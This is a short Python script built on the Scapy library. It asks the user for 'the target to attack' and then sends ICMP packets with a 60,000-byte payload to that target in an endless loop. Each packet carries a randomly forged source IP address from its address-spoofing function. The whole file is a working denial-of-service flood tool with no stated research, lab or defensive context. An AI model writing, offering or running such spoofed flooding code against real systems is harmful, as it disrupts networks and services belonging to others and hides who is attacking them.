from scapy.all import *
import random

def address_spoofer():
    addr = [192, 168, 0, 1]
    d = '.'

    addr[0] = str(random.randrange(11,197))
    addr[1] = str(random.randrange(0,255))
    addr[2] = str(random.randrange(0,255))
    addr[3] = str(random.randrange(0,254))

    assembled = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
    print (assembled)
    return assembled

target = input("Enter the target to attack: ")

while True:
    rand_addr = address_spoofer()
    ip_hdr = IP(src=rand_addr, dst=target)
    packet = ip_hdr / ICMP()/("m"*60000)
    send(packet)
